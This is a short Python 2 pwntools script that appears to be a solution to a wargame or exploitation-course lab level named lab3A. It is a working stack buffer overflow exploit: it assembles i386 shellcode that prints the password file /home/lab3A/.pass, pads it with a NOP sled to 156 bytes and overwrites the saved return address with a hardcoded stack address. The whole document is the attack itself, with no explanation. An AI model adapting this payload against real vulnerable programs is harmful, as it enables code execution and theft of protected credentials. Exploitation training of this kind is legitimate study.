#!/usr/local/bin/python2

from pwn import *

context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'

shellcode = asm(shellcraft.i386.cat("/home/lab3A/.pass"))

payload = ""
payload += "\x90" * (156 - len(shellcode))
payload += shellcode
payload += p32(0xbffff6e0) # EIP. This might be different for you

print payload
